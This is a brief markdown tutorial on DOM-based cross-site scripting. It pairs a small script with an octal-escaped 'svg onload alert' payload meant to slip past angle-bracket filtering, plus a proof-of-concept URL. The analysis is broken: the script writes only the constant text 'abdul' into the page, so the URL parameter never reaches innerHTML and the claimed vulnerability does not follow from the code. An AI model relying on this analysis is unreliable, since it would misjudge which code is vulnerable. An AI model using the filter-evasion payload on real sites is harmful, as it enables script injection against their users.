# DOM XSS Analysis 

**It may help you to understand 'DOM' how it's work and how it can be manipulate and inject XSS Payload, Let's see.**

## Analysis 1:

**Vulnerable code:**
```html
<script>
   var g = document.getElementById("h1");
   if (document.location.search.match("p")) {
      g.innerHTML = "abdul";
   }
</script>
```
_Analysis:_ __Here script is using the value of the URL search parameter "p" to determine whether or not to update the innerHTML of an HTML element
with the id of "h1". If the value of "p" is coming from an untrusted source, such as user input, it could potentially be a source of a 
(XSS) vulnerability. And sanitize <> here is payload used - `\74svg o\156load\75alert\501\51\76`__

_poc:_ `https://example.com/index.php?p=\74svg o\156load\75alert\501\51\76` 


